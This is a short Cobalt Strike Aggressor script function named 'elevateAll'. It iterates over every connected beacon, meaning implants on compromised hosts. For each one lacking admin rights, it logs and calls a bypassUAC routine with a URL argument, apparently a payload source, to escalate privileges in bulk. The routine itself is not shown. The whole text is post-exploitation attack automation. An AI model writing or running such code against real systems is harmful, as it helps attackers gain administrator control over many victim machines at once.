sub elevateAll {
    # local('$listener');
    # $listener = $1;

    local('$url');
    $url = $1

    # Iterate over all beacons with beacons()
    foreach $b (beacons()) {
        # Get the id field from $b
        $bid = $b['id'];

        if (!-isadmin $bid) {
            elog("Attempting to elevate beacon $bid");
            # bbypassuac($bid, $listener);
            bypassUAC($bid, $url);
        }
        sleep(1000);
    }
}